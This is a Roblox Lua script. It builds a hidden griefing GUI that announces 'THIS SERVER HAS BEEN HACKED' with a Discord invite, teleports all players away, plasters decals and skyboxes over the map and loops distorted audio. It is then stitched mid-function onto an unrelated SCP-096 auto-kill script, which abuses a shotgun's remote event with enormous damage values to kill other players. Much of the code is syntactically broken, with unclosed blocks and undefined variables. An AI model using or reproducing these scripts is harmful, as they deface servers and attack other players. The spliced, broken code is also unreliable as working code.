local Players = game:GetService("Players")
local Debris = game:GetService("Debris")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local TARGET_PLACE_ID = 72742428103609
local allowedPlayerName = "Yo Username Here"

local function createGui(player)
	if player.Name ~= allowedPlayerName then
		return
	end

	-- Prevent duplicate GUI
	local playerGui = player:WaitForChild("PlayerGui")

	if playerGui:FindFirstChild("Vata909tt_IsBackGui") then
		playerGui.Vata909tt_IsBackGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "Vata909tt_IsBackGui"
	gui.ResetOnSpawn = false
	gui.Parent = playerGui

	--==================================================
	-- MAIN FRAME
	--==================================================

	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, 420, 0, 320)
	mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
	mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	mainFrame.BorderSizePixel = 0
	mainFrame.Visible = false
	mainFrame.Parent = gui

	local mainCorner = Instance.new("UICorner")
	mainCorner.CornerRadius = UDim.new(0, 10)
	mainCorner.Parent = mainFrame

	--==================================================
	-- TITLE BAR
	--==================================================

	local titleBar = Instance.new("TextLabel")
	titleBar.Name = "TitleBar"
	titleBar.Size = UDim2.new(1, 0, 0, 30)
	titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	titleBar.Text = "Vata909tt GUI"
	titleBar.Font = Enum.Font.GothamBold
	titleBar.TextColor3 = Color3.new(1, 1, 1)
	titleBar.TextSize = 16
	titleBar.BorderSizePixel = 0
	titleBar.Parent = mainFrame

	local titleCorner = Instance.new("UICorner")
	titleCorner.CornerRadius = UDim.new(0, 10)
	titleCorner.Parent = titleBar

	--==================================================
	-- SCROLL FRAME
	--==================================================

	local scroll = Instance.new("ScrollingFrame")
	scroll.Name = "ScrollFrame"
	scroll.Size = UDim2.new(1, -20, 1, -60)
	scroll.Position = UDim2.new(0, 10, 0, 40)
	scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
	scroll.ScrollBarThickness = 6
	scroll.BackgroundTransparency = 1
	scroll.BorderSizePixel = 0
	scroll.Parent = mainFrame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 10)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scroll

	--==================================================
	-- TOGGLE BUTTON
	--==================================================

	local toggleBtn = Instance.new("TextButton")
	toggleBtn.Name = "ToggleButton"
	toggleBtn.Size = UDim2.new(0, 110, 0, 30)
	toggleBtn.Position = UDim2.new(0, 10, 0, 10)
	toggleBtn.Text = "Open GUI"
	toggleBtn.Font = Enum.Font.GothamBold
	toggleBtn.TextColor3 = Color3.new(1, 1, 1)
	toggleBtn.TextSize = 14
	toggleBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	toggleBtn.BorderSizePixel = 0
	toggleBtn.Parent = gui

	local toggleCorner = Instance.new("UICorner")
	toggleCorner.CornerRadius = UDim.new(0, 8)
	toggleCorner.Parent = toggleBtn

	--==================================================
	-- DRAGGING
	--==================================================

	local dragging = false
	local dragInput
	local dragStart
	local startPos

	titleBar.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = mainFrame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	titleBar.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart

			local camera = workspace.CurrentCamera
			if camera then
				local viewport = camera.ViewportSize

				local newX = math.clamp(
					startPos.X.Offset + delta.X,
					0,
					math.max(0, viewport.X - mainFrame.AbsoluteSize.X)
				)

				local newY = math.clamp(
					startPos.Y.Offset + delta.Y,
					0,
					math.max(0, viewport.Y - mainFrame.AbsoluteSize.Y)
				)

				mainFrame.Position = UDim2.new(
					startPos.X.Scale,
					newX,
					startPos.Y.Scale,
					newY
				)
			end
		end
	end)

	--==================================================
	-- BUTTON CREATOR
	--==================================================

	local function addButton(text, callback)
		local btn = Instance.new("TextButton")

		btn.Size = UDim2.new(1, 0, 0, 40)
		btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
		btn.TextColor3 = Color3.new(1, 1, 1)
		btn.Font = Enum.Font.GothamBold
		btn.TextSize = 14
		btn.Text = text
		btn.BorderSizePixel = 0
		btn.Parent = scroll

		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(0, 8)
		corner.Parent = btn

		btn.MouseButton1Click:Connect(function()
			local success, err = pcall(callback)

			if not success then
				warn("GUI button error:", err)
			end
		end)

		return btn
	end

	--==================================================
	-- MAKE HINT
	--==================================================

	addButton("Make Hint", function()
		local hint = Instance.new("Hint")
		hint.Text = "THIS SERVER HAS BEEN HACKED BY VATA909TT!! DISC INVITE: https://discord.gg/sbTnFCrVj"
		hint.Parent = workspace

		Debris:AddItem(hint, 10)
	end)

	addButton("Relam", function()
		local playerList = Players:GetPlayers()

		if #playerList == 0 then
			return
		end

		local success, result = pcall(function()
			return TeleportService:TeleportAsync(TARGET_PLACE_ID, playerList)
		end)

		if not success then
			warn("Teleport failed:", result)
		end
	end)
	
	addButton("Make Message", function()
		local message = Instance.new("Message")
		message.Text = "THIS SERVER HAS BEEN HACKED BY VATA909TT!! DISC INVITE: https://discord.gg/sbTnFCrVj"
		message.Parent = workspace

		Debris:AddItem(message, 5)
	end)


	--==================================================
	-- FALLING HEADS
	--==================================================

	addButton("Spawn Falling Heads", function()
		local camera = workspace.CurrentCamera
		if not camera then
			return
		end

		for i = 1, 10 do
			local head = Instance.new("Part")

			head.Size = Vector3.new(2, 1, 1)
			head.Shape = Enum.PartType.Ball
			head.Color = Color3.fromRGB(255, 200, 200)
			head.Material = Enum.Material.SmoothPlastic
			head.Name = "FallingHead"

			head.Position = camera.CFrame.Position + Vector3.new(
				math.random(-10, 10),
				math.random(20, 30),
				math.random(-10, 10)
			)

			head.Anchored = false
			head.CanCollide = true
			head.Parent = workspace

			local decal = Instance.new("Decal")
			decal.Texture = "rbxassetid://7075746925"
			decal.Face = Enum.NormalId.Front
			decal.Parent = head

			Debris:AddItem(head, 10)
		end
	end)

	--==================================================
	-- ADD DECALS
	--==================================================

	addButton("Add Decals", function()
		local decalTextureId = "rbxassetid://73859504735494"

		local faces = {
			Enum.NormalId.Front,
			Enum.NormalId.Back,
			Enum.NormalId.Left,
			Enum.NormalId.Right,
			Enum.NormalId.Top,
			Enum.NormalId.Bottom
		}

		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then

				-- Skip characters/NPCs
				local parentModel = part:FindFirstAncestorOfClass("Model")

				if not (
					parentModel
						and parentModel:FindFirstChildOfClass("Humanoid")
					) then

					-- Remove existing decals
					for _, child in ipairs(part:GetChildren()) do
						if child:IsA("Decal") then
							child:Destroy()
						end
					end

					-- Add decal to all six faces
					for _, face in ipairs(faces) do
						local decal = Instance.new("Decal")

						decal.Name = "VataDecal"
						decal.Texture = decalTextureId
						decal.Face = face
						decal.Transparency = 0

						decal.Parent = part
					end
				end
			end
		end
	end)

	--==================================================
	-- SKY
	--==================================================

	addButton("Sky", function()
		local skyTextureId = "rbxassetid://71869538800676"

		-- Remove old skies
		for _, obj in ipairs(Lighting:GetChildren()) do
			if obj:IsA("Sky") then
				obj:Destroy()
			end
		end

		local sky = Instance.new("Sky")

		sky.Name = "VataSky"
		sky.SkyboxBk = skyTextureId
		sky.SkyboxDn = skyTextureId
		sky.SkyboxFt = skyTextureId
		sky.SkyboxLf = skyTextureId
		sky.SkyboxRt = skyTextureId
		sky.SkyboxUp = skyTextureId

		sky.Parent = Lighting
	end)

	--==================================================
	-- FLIP GRAVITY
	--==================================================

	addButton("Flip Gravity", function()
		if workspace.Gravity == 196.2 then
			workspace.Gravity = -196.2
		else
			workspace.Gravity = 196.2
		end
	end)

	--==================================================
	-- RANDOM TELEPORT ALL
	--==================================================

	addButton("Random Teleport All", function()
		for _, p in ipairs(Players:GetPlayers()) do
			if p.Character then
				local root = p.Character:FindFirstChild("HumanoidRootPart")

				if root then
					root.CFrame = CFrame.new(
						math.random(-100, 100),
						math.random(10, 50),
						math.random(-100, 100)
					)
				end
			end
		end
	end)

	--==================================================
	-- EXPLOSIVE ORBS
	--==================================================

	addButton("Spawn Explosive Orbs", function()
		local camera = workspace.CurrentCamera

		if not camera then
			return
		end

		for i = 1, 10 do
			local orb = Instance.new("Part")

			orb.Shape = Enum.PartType.Ball
			orb.Size = Vector3.new(3, 3, 3)
			orb.Material = Enum.Material.Neon
			orb.BrickColor = BrickColor.Random()
			orb.Anchored = false
			orb.CanCollide = false

			orb.Position = camera.CFrame.Position + Vector3.new(
				math.random(-15, 15),
				math.random(10, 20),
				math.random(-15, 15)
			)

			orb.Name = "ExplosiveOrb"
			orb.Parent = workspace

			local bodyVelocity = Instance.new("BodyVelocity")

			bodyVelocity.Velocity = Vector3.new(
				math.random(-20, 20),
				math.random(10, 30),
				math.random(-20, 20)
			)

			bodyVelocity.P = 5000
			bodyVelocity.MaxForce = Vector3.new(
				10000,
				10000,
				10000
			)

			bodyVelocity.Parent = orb

			Debris:AddItem(orb, 10)
		end
	end)

	--==================================================
	-- NIGHT VISION
	--==================================================

	local nightVisionEnabled = false

	addButton("Toggle Night Vision", function()
		local blur = Lighting:FindFirstChild("VataNightVisionBlur")
		local cc = Lighting:FindFirstChild("VataNightVisionColor")

		if nightVisionEnabled then

			if blur then
				blur.Enabled = false
			end

			if cc then
				cc.Enabled = false
			end

			nightVisionEnabled = false

		else

			if not blur then
				blur = Instance.new("BlurEffect")
				blur.Name = "VataNightVisionBlur"
				blur.Parent = Lighting
			end

			blur.Size = 3
			blur.Enabled = true

			if not cc then
				cc = Instance.new("ColorCorrectionEffect")
				cc.Name = "VataNightVisionColor"
				cc.Parent = Lighting
			end

			cc.TintColor = Color3.fromRGB(100, 255, 100)
			cc.Brightness = 0.15
			cc.Contrast = 0.1
			cc.Enabled = true

			nightVisionEnabled = true
		end
	end)

	--==================================================
	-- MUSIC
	--==================================================

	local musicPlaying = false
	local musicSound

	addButton("Toggle Music", function()
		if not musicSound then
			musicSound = Instance.new("Sound")

			musicSound.Name = "VataMusic"
			musicSound.SoundId = "rbxassetid://1840712882"
			musicSound.Looped = true
			musicSound.Volume = 1
			musicSound.Parent = workspace

			local distortion1 = Instance.new("DistortionSoundEffect")
			distortion1.Level = 1
			distortion1.Parent = musicSound
		end

		if musicPlaying then
			musicSound:Stop()
			musicPlaying = false
		else
			musicSound:Play()
			musicPlaying = true
		end
	end)
	
	addButton("Anonymus", function()
		-- Looping Anonymous Sound (Começa aos 9 segundos + Distorção)
		local Spooky1 = Instance.new("Sound")
		Spooky1.Parent = workspace
		Spooky1.Name = "Anonymousshii"
		Spooky1.SoundId = "rbxassetid://1840712882"
		Spooky1.Volume = 10
		Spooky1.Looped = true

		local distortion1 = Instance.new("DistortionSoundEffect")
		distortion1.Level = 1
		distortion1.Parent = Spooky1

		Spooky1.Loaded:Wait()
		Spooky1.TimePosition = 8.6
		Spooky1:Play()

		-- Apply Decal to All Sides
		local decalId = "rbxassetid://127476787"

		local function applyDecalToAllSides(part)
			local faces = {
				Enum.NormalId.Top,
				Enum.NormalId.Bottom,
				Enum.NormalId.Left,
				Enum.NormalId.Right,
				Enum.NormalId.Front,
				Enum.NormalId.Back

			for _, face in ipairs(faces) do
				local decal = Instance.new("Decal")

				decal.Parent = part
			end
		end

		for _, part in ipairs(workspace:GetDescendants()) do

				applyDecalToAllSides(part)
			end
		end

		-- Skybox
		local skyId = "rbxassetid://18876121366"

		local sky = Instance.new("Sky")
		sky.SkyboxBk = skyId
		sky.SkyboxDn = skyId
		sky.SkyboxFt = skyId
		sky.SkyboxLf = skyId
		sky.SkyboxRt = skyId
		sky.SkyboxUp = skyId
		sky.Parent = game.Lighting

		-- Fog
		local lighting = game.Lighting
		lighting.FogColor = Color3.fromRGB(20, 20, 20)
		lighting.FogStart = 0
		lighting.FogEnd = 300

		-- Repeating Sound Every 10 Seconds
		task.spawn(function()
			while true do
				local repeatSound = Instance.new("Sound")
				repeatSound.Parent = workspace
				repeatSound.Name = "RepeatingSound"
				repeatSound.SoundId = "rbxassetid://0"
				repeatSound.Volume = 10
				repeatSound.Looped = false

				local distortion2 = Instance.new("DistortionSoundEffect")
				distortion2.Level = 0.99
				distortion2.Parent = repeatSound

				repeatSound.Loaded:Wait()
				repeatSound.TimePosition = 9
				repeatSound:Play()

				repeatSound.Ended:Connect(function()
					repeatSound:Destroy()
				end)

				task.wait(10)
			end
		end)

		-- Modifica todas as partes
		local function exPro(root)
			for _, v in ipairs(root:GetChildren()) do
				if v:IsA("BasePart") then
					v.Material = Enum.Material.Plastic
					v.Transparency = 1
					v.Locked = false

			end

		local function asdf(root)
			for _, v in ipairs(root:GetChildren()) do
				asdf(v)
			end
		end

		exPro(workspace)
		asdf(workspace)

		-- Example:

		part.Position = Vector3.new(0, 10, 0)

		particles.Rate = 100

    tPoseTrack = animator:LoadAnimation(anim)
    tPoseTrack.Priority = Enum.AnimationPriority.Action
    tPoseTrack:Play()
    
    if not IdleSound.IsPlaying then IdleSound:Play() end
end

local currentAnimTrack = nil
local function playKillAnimation()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return nil end
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
    local anim = Instance.new("Animation")
    -- Updated to new Classic SCP 096 Kill Animation
    anim.AnimationId = "rbxassetid://15172539171"
    
    local success, track = pcall(function() return animator:LoadAnimation(anim) end)
    if success and track then
        if currentAnimTrack then currentAnimTrack:Stop() end
        currentAnimTrack = track
        track.Priority = Enum.AnimationPriority.Action4
        track:Play(0.1, 1, 1.0)
        return track
    end
    return nil
end

local function calculateDamage()
    return math.random(1, 100) <= CRITICAL_CHANCE and (10^30 + 10^18) or 500
end

local function executeKillTarget(targetHum)
    if not targetHum or targetHum.Health <= 0 then return end
    local damage = calculateDamage()
    local shotgun = getTool("Shotgun")
    if shotgun and shotgun:FindFirstChild("Receiver") then
        shotgun.Receiver:FireServer("Damage", targetHum, damage)
    else
        targetHum.Health = 0
    end
end

-- State Transitions
local function transitionToIdle()
    currentState = "IDLE"
    currentTarget = nil
    isKillingActive = false
    unequipAllToolsFast()
    equipTool(IDLE_TOOL)
    lastKillEndTime = os.clock()
    
    if ScreamingSound.IsPlaying then ScreamingSound:Stop() end
    if not IdleSound.IsPlaying then IdleSound:Play() end
    
    -- Reset pathfinding smoothing variables
    lastTargetPos = nil
    currentWaypoints = nil
    
    task.spawn(function()
        task.wait(0.15)
        if currentState == "IDLE" then autoClickScreen() end
    end)
end

local function doTeleport()
    local block = Workspace:FindFirstChild("Block")
    if block then
        local parts = block:GetChildren()
        if parts[198] and LocalPlayer.Character then
            local targetPart = parts[198]
            local lookVector = targetPart.CFrame.LookVector
            LocalPlayer.Character:PivotTo(CFrame.new(targetPart.Position, targetPart.Position + lookVector))
        end
    end
    transitionToIdle()
end

local function transitionToRunStart(targetModel)
    if currentState ~= "IDLE" or not targetModel then return end
    if os.clock() - lastKillEndTime < KILL_COOLDOWN then return end
    
    currentState = "RUN_START"
    currentTarget = targetModel
    stateStartTime = os.clock()
    unequipAllToolsFast()
    equipTool(RUN_TOOL)
    
    IdleSound:Stop()
    if not ScreamingSound.IsPlaying then ScreamingSound:Play() end
    
    task.spawn(function()
        task.wait(0.15)
        if currentState == "RUN_START" or currentState == "CHASE" then
            autoClickScreen()
        end
    end)
end

local function transitionToChase()
    if currentState ~= "RUN_START" then return end
    currentState = "CHASE"
    chaseStartTime = os.clock()
end

local function transitionToKill(targetHumanoid)
    if currentState ~= "CHASE" or isKillingActive or not targetHumanoid then return end
    currentState = "KILL"
    isKillingActive = true
    unequipAllToolsFast()
    equipTool(KILL_TOOL)
    playSyncKillAudioFE()

    -- Mute Screaming audio during kill animation
    ScreamingSound.Volume = 0

    local track = playKillAnimation()
    local isPlayer = Players:GetPlayerFromCharacter(targetHumanoid.Parent) ~= nil

    task.spawn(function()
        local startTime = os.clock()
        
        if not isPlayer then
            if track then track:AdjustSpeed(10) end 
            local godModeTriggered = false
            
            while targetHumanoid and targetHumanoid.Parent and targetHumanoid.Health > 0 do
                executeKillTarget(targetHumanoid)
                
                if os.clock() - startTime > 2.0 and not godModeTriggered then
                    godModeTriggered = true
                    if track then track:Stop() end
                    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if hum then
                        for _, playingTrack in ipairs(hum:GetPlayingAnimationTracks()) do
                            playingTrack:Stop()
                        end
                    end
                end
                task.wait(0.1) 
            end
        else
            local animDuration = (track and track.Length > 0) and track.Length or KILL_ANIMATION_DURATION
            while (os.clock() - startTime < animDuration) do
                if targetHumanoid and targetHumanoid.Parent and targetHumanoid.Health > 0 then
                    executeKillTarget(targetHumanoid)
                end
                task.wait(0.15)
            end
        end
        
        if track then track:Stop() end
        
        -- Restore Screaming audio volume and go Idle, stopping chase
        ScreamingSound.Volume = 1.5
        transitionToIdle()
    end)
end

-- Invisible Kill Tool
local function giveCustomKillTool()
    local backpack = LocalPlayer:FindFirstChild("Backpack") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Backpack"))
    if not backpack then return end

    local oldTool = backpack:FindFirstChild(KILL_TOOL) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(KILL_TOOL))
    if oldTool then oldTool:Destroy() end

    local killTool = Instance.new("Tool")
    killTool.Name = KILL_TOOL
    killTool.RequiresHandle = true
    killTool.CanBeDropped = false
    killTool.Parent = backpack

    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Transparency = 1
    handle.CanCollide = false
    handle.Parent = killTool
end

-- Touch Detection (Includes Fixed Manual Touch Kill)
local function setupTouchListener()
    if touchConnection then touchConnection:Disconnect() end
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
    if not root then return end

    touchConnection = root.Touched:Connect(function(hit)
        local hitModel = hit.Parent
        if not hitModel or hitModel == char then return end
        local pHum = hitModel:FindFirstChildOfClass("Humanoid")
        if not pHum or pHum.Health <= 0 then return end

        if manualModeEnabled and isToolEquipped(KILL_TOOL) and not isKillingActive then
            if os.clock() - lastKillEndTime < KILL_COOLDOWN then return end
            isKillingActive = true
            playSyncKillAudioFE()
            ScreamingSound.Volume = 0
            
            local track = playKillAnimation()
            local animDuration = (track and track.Length > 0) and track.Length or KILL_ANIMATION_DURATION

            task.spawn(function()
                local startTime = os.clock()
                while (os.clock() - startTime < animDuration) do
                    executeKillTarget(pHum)
                    task.wait(0.15)
                end
                if track then track:Stop() end
                isKillingActive = false
                lastKillEndTime = os.clock()
                ScreamingSound.Volume = 1.5
            end)
        elseif aiEnabled and currentState == "IDLE" then
            if os.clock() - lastKillEndTime < KILL_COOLDOWN then return end
            local isPlayer = Players:GetPlayerFromCharacter(hitModel) ~= nil
            if not npcTestingEnabled or not isPlayer then
                transitionToRunStart(hitModel)
            end
        end
    end)
end

-- Initialization & Respawn
LocalPlayer.CharacterAdded:Connect(function(newChar)
    task.wait(0.5)
    setupTouchListener()
    playTPoseEmote()
end)
if LocalPlayer.Character then

end

-- Main State Machine Loop
RunService.RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")

    if showBubble then
        if not bubblePart then
            bubblePart = Instance.new("Part")
            bubblePart.Shape = Enum.PartType.Ball; bubblePart.Size = Vector3.new(BUBBLE_RADIUS*2, BUBBLE_RADIUS*2, BUBBLE_RADIUS*2)
            bubblePart.Transparency = 0.7; bubblePart.Anchored = true; bubblePart.CanCollide = false
            bubblePart.Material = Enum.Material.ForceField; bubblePart.BrickColor = BrickColor.new("Cyan")
            bubblePart.Parent = Workspace
            
            bubblePart.Touched:Connect(function(hit)
                if not aiEnabled or currentState ~= "IDLE" then return end
                local hitModel = hit.Parent
                if hitModel and hitModel ~= char then
                    local hum = hitModel:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then
                        equipTool(RUN_TOOL)
                        autoClickScreen()
                        transitionToRunStart(hitModel)
                    end
                end
            end)
        end
        if root then bubblePart.Position = root.Position end
    end

    if not aiEnabled or not char or not humanoid or not root then return end

    -- Notice Trigger Detection
    if not hasTriggeredNotice and currentState == "IDLE" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local pChar = player.Character
                local pRoot = pChar and (pChar:FindFirstChild("HumanoidRootPart") or pChar:FindFirstChild("Torso"))
                if pRoot and (root.Position - pRoot.Position).Magnitude <= 9 then
                    hasTriggeredNotice = true
                    if tPoseTrack then tPoseTrack:Stop() end
                    
                    IdleSound:Stop()
                    NoticeSound:Play()
                    
                    -- Reset Idle Animation by unequipping and equipping
                    unequipAllToolsFast()
                    task.wait(0.1)
                    equipTool(IDLE_TOOL)
                    
                    -- Play sound again after reset
                    IdleSound:Play()
                    break
                end
            end
        end
    end

    if currentState == "IDLE" then
        if not isToolEquipped(IDLE_TOOL) then unequipAllToolsFast(); equipTool(IDLE_TOOL) end
        if os.clock() - lastKillEndTime < KILL_COOLDOWN then return end
        
        if os.clock() - lastScanTime >= 0.2 then
            lastScanTime = os.clock()
            
            local specificTarget = Workspace:FindFirstChild("SCP 096SL")
            if specificTarget then
                local tRoot = specificTarget:FindFirstChild("HumanoidRootPart")
                local tHum = specificTarget:FindFirstChildOfClass("Humanoid")
                if tRoot and tHum and tHum.Health > 0 and (root.Position - tRoot.Position).Magnitude <= BUBBLE_RADIUS then
                    transitionToRunStart(specificTarget)
                    return
                end
            end

            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local pChar = player.Character
                    local pRoot = pChar and (pChar:FindFirstChild("HumanoidRootPart") or pChar:FindFirstChild("Torso"))
                    local pHum = pChar and pChar:FindFirstChildOfClass("Humanoid")
                    if pRoot and pHum and pHum.Health > 0 and (root.Position - pRoot.Position).Magnitude <= BUBBLE_RADIUS then
                        transitionToRunStart(pChar)
                        return
                    end
                end
            end
        end

    elseif currentState == "RUN_START" then
        if not isToolEquipped(RUN_TOOL) then unequipAllToolsFast(); equipTool(RUN_TOOL) end
        if os.clock() - stateStartTime >= RUN_START_DELAY then transitionToChase() end

    elseif currentState == "CHASE" then
        if not currentTarget or not currentTarget.Parent then transitionToIdle(); return end
        local targetHum = currentTarget:FindFirstChildOfClass("Humanoid")
        local targetRoot = currentTarget:FindFirstChild("HumanoidRootPart") or currentTarget:FindFirstChild("Torso")

        if targetHum and targetHum.Health <= 0 then
            transitionToIdle()
            return
        end

        if not targetHum or not targetRoot then transitionToIdle(); return end
        if not isToolEquipped(RUN_TOOL) then unequipAllToolsFast(); equipTool(RUN_TOOL) end

        local distToTarget = (root.Position - targetRoot.Position).Magnitude
        
        if distToTarget > SUPER_FAR_DISTANCE then
            -- Target is too far, freeze movement but maintain state and run animation
            humanoid:MoveTo(root.Position) 
        else
            if os.clock() - lastPathTime >= 0.2 then
                lastPathTime = os.clock()
                local targetPos = targetRoot.Position
                
                if not lastTargetPos or (lastTargetPos - targetPos).Magnitude > 3.0 then
                    lastTargetPos = targetPos
                    -- Smart Pathfinding Config
                    local path = PathfindingService:CreatePath({
                        AgentRadius = 2.0, 
                        AgentHeight = 5.0, 
                        WaypointSpacing = 4.0,
                        AgentCanJump = true
                    })
                    path:ComputeAsync(root.Position, targetPos)
                    
                    if path.Status == Enum.PathStatus.Success then
                        currentWaypoints = path:GetWaypoints()
                        currentWaypointIndex = 2
                    else
                        -- Path blocked (doors closed, tall places), clear waypoints
                        currentWaypoints = nil
                    end
                end
            end

            if currentWaypoints and currentWaypointIndex <= #currentWaypoints then
                local targetWp = currentWaypoints[currentWaypointIndex].Position
                humanoid:MoveTo(targetWp)
                
                if (root.Position - Vector3.new(targetWp.X, root.Position.Y, targetWp.Z)).Magnitude < 3.5 then
                    currentWaypointIndex = currentWaypointIndex + 1
                end
            else
                -- Freeze if target is unreachable (behind door/tall place), but maintain run tool
                humanoid:MoveTo(root.Position)
            end
        end

        if distToTarget <= KILL_DISTANCE and (os.clock() - chaseStartTime) >= MIN_CHASE_DURATION then
            transitionToKill(targetHum)
        end

    elseif currentState == "KILL" then
        if currentTarget then
            local targetRoot = currentTarget:FindFirstChild("HumanoidRootPart") or currentTarget:FindFirstChild("Torso")
            if targetRoot then humanoid:MoveTo(targetRoot.Position) end
        end
    end
end)
